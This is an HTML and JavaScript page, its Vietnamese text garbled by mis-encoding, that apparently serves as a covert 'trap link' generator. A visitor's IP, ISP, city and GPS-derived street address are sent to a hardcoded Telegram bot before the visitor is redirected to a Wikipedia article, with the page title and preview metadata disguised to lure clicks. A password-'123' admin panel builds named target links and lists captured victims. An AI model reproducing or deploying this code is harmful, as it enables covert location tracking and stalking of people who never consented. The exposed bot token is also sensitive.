<body id="main-body" class="victim-body">

    <div id="ui-victim">

    </div>

    <div id="ui-admin" class="hidden w-full p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">

                <h1 class="text-xl font-black text-white italic">V·ªã Tr√≠</h1>

            </header>

            <div class="grid lg:grid-cols-12 gap-6">
                <div class="lg:col-span-5 space-y-6">
                    <div class="glass p-5 space-y-4">
                        <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest italic">1. Ch·ªânh s·ª≠a th√¥ng tin hi·ªÉn th·ªã</h3>
                        <div class="space-y-3">
                            <input id="ed-title" type="text" placeholder="Ti√™u ƒë·ªÅ b√†i vi·∫øt (Title)" class="input-dark" oninput="updateUI()">
                            <textarea id="ed-desc" placeholder="M√¥ t·∫£ n·ªôi dung (Description)" class="input-dark h-16 resize-none" oninput="updateUI()"></textarea>
                            <input id="ed-img" type="text" placeholder="Link ·∫£nh ƒë·∫°i di·ªán (Image URL)" class="input-dark" oninput="updateUI()">
                        </div>

                            <img id="pre-img" src="" class="w-full h-32 object-cover">

                    <div class="glass p-5 space-y-4">

                        <div class="grid grid-cols-2 gap-2">

                            <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
                        </div>
                        <input id="cfg-rd" type="text" placeholder="Link chuy·ªÉn h∆∞·ªõng ƒë√≠ch" class="input-dark">
                        <input id="in-target" type="text" placeholder="T√™n m·ª•c ti√™u..." class="input-dark">
                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase">L∆∞u & T·∫°o Link</button>
                        <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/30">
                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center leading-relaxed"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-7">
                    <div class="glass min-h-[550px] flex flex-col overflow-hidden">
                        <div class="p-4 border-b border-gray-800 flex justify-between bg-black/20">
                            <h3 class="text-[10px] font-black text-white uppercase italic">Live Intelligence Logs</h3>
                            <button onclick="clearLogs()" class="text-[9px] text-gray-500 hover:text-red-500 font-bold uppercase">X√≥a l·ªãch s·ª≠</button>
                        </div>
                        <div class="overflow-x-auto flex-1">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black/50 text-gray-500 uppercase text-[9px] font-bold">
                                    <tr><th class="p-4">ƒê·ªëi t∆∞·ª£ng</th><th class="p-4">IP / ISP</th><th class="p-4">ƒê·ªãa ch·ªâ ch·ªØ</th><th class="p-4 text-right">Map</th></tr>
                                </thead>
                                <tbody id="log-list" class="divide-y divide-gray-800 text-gray-300"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let config = {
            t: "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4",
            i: "857408205",
            r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n",
            mt: "Ti·ªÉu s·ª≠ ƒê·ª©c qu·ªëc c√¥ng ƒê√†o Minh Qu√¢n",
            md: "T·ªôi √°c c·ªông s·∫£n v·ªõi ƒê√†o Minh Qu√¢n v√† c√¥ng ∆°n cao c·∫£ c·ªßa Ng√†i.",
            mi: "https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg"
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                if (localStorage.getItem('v25_auth') === 'true' || prompt("M·∫≠t kh·∫©u:") === "123") {
                    localStorage.setItem('v25_auth', 'true');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { startPhantom(); }
        };

        async function startPhantom() {
            // GI·∫¢I M√É C·∫§U H√åNH T·ª™ URL ƒê·ªÇ GHI ƒê√à TITLE/META TH·ª∞C T·∫æ
            try { 
                const v = urlParams.get('v'); 
                if(v) config = JSON.parse(decodeURIComponent(escape(atob(v)))); 
                
                // C·∫≠p nh·∫≠t th·∫ª Meta TH·∫¨T c·ªßa trang ƒë·ªÉ ng·ª•y trang
                document.title = config.mt;
                document.getElementById('dyn-title').innerText = config.mt;
                document.getElementById('meta-desc').content = config.md;
                document.getElementById('og-title').content = config.mt;
                document.getElementById('og-desc').content = config.md;
                document.getElementById('og-img').content = config.mi;
            } catch(e) {}

            const target = urlParams.get('name') || 'GUEST';
            let ipInfo = { ip: 'N/A', org: 'N/A', city: 'N/A', lat: 0, lon: 0 };

            try {
                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
                ipInfo = res;
                addLog({ name: target, ...ipInfo, address: res.city + ", " + res.country_name, time: new Date().toLocaleTimeString(), st: 'IP' });
                await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + target + "</b> truy c·∫≠p\nüåê IP: " + res.ip + "\nüìç V√πng: " + res.city)}`);
            } catch(e) {}

            const jump = () => window.location.replace(config.r);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    let fullAddr = "T·ªça ƒë·ªô: " + lat + ", " + lon;
                    try {
                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                        fullAddr = geo.display_name || fullAddr;
                    } catch(e) {}
                    updateLog(target, lat, lon, fullAddr);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + target + "</b> GPS OK\nüìç " + fullAddr + "\nüó∫Ô∏è Map: https://www.google.com/maps?q=$" + lat + "," + lon)}`);
                    jump();
                }, jump, { timeout: 5000 });
            } else { jump(); }
            setTimeout(jump, 8000);
        }

        // --- ADMIN FUNCTIONS ---
        function initAdmin() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            
            const saved = localStorage.getItem('v25_cfg');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            document.getElementById('ed-title').value = config.mt;
            document.getElementById('ed-desc').value = config.md;
            document.getElementById('ed-img').value = config.mi;
            
            updateUI();
            renderLogs();
            setInterval(renderLogs, 3000); // T·ª∞ ƒê·ªòNG C·∫¨P NH·∫¨T NH·∫¨T K√ù M·ªñI 3 GI√ÇY
        }

        function updateUI() {
            const t = document.getElementById('ed-title').value;
            const d = document.getElementById('ed-desc').value;
            const i = document.getElementById('ed-img').value;
            document.getElementById('pre-title').innerText = t;
            document.getElementById('pre-desc').innerText = d;
            document.getElementById('pre-img').src = i;
        }

        function saveAndBuild() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            config.mt = document.getElementById('ed-title').value;
            config.md = document.getElementById('ed-desc').value;
            config.mi = document.getElementById('ed-img').value;
            localStorage.setItem('v25_cfg', JSON.stringify(config));
            
            const name = document.getElementById('in-target').value || 'Target';
            const base = window.location.href.split('?')[0];
            // Encode c·∫•u h√¨nh v√†o link b·∫´y
            const v = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
            const finalLink = `${base}?name=${encodeURIComponent(name)}&v=${v}`;
            
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = finalLink;
            alert("ƒê√£ ƒë·ªìng b·ªô th√¥ng s·ªë!");
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('v25_logs') || '[]');
            const table = document.getElementById('log-list');
            const html = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                    <td class="p-4 font-bold text-white uppercase">${l.name}<br><span class="text-[8px] text-gray-600 font-normal">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-gray-600 uppercase font-sans">${l.org}</span></td>
                    <td class="p-4 text-gray-300 text-[9px] leading-relaxed max-w-[150px]">${l.address || l.city}</td>
                    <td class="p-4 text-right">
                        ${l.st === 'GPS' ? `<a href="http://google.com/maps?q=0{l.lat},${l.lon}" target="_blank" class="bg-green-600/20 text-green-500 border border-green-600/30 px-2 py-1 rounded text-[9px] font-black">MAP</a>` : `<span class="text-gray-700 italic text-[9px]">IP ONLY</span>`}
                    </td>
                </tr>
            `).join('');
            table.innerHTML = html || '<tr><td colspan="4" class="p-10 text-center text-gray-700">Ch∆∞a c√≥ d·ªØ li·ªáu...</td></tr>';
        }

        function addLog(data) {
            let logs = JSON.parse(localStorage.getItem('v25_logs') || '[]');
            logs.unshift(data);
            localStorage.setItem('v25_logs', JSON.stringify(logs.slice(0, 50)));
        }

        function updateLog(name, lat, lon, addr) {
            let logs = JSON.parse(localStorage.getItem('v25_logs') || '[]');
            if(logs.length > 0 && logs[0].name === name) {
                logs[0].st = 'GPS'; logs[0].lat = lat; logs[0].lon = lon; logs[0].address = addr;
            }
            localStorage.setItem('v25_logs', JSON.stringify(logs));
        }

        function clearLogs() { if(confirm("X√≥a s·∫°ch nh·∫≠t k√Ω?")) { localStorage.removeItem('v25_logs'); renderLogs(); } }
        function logout() { localStorage.removeItem('v25_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy Link!"); }
    </script>
</body>
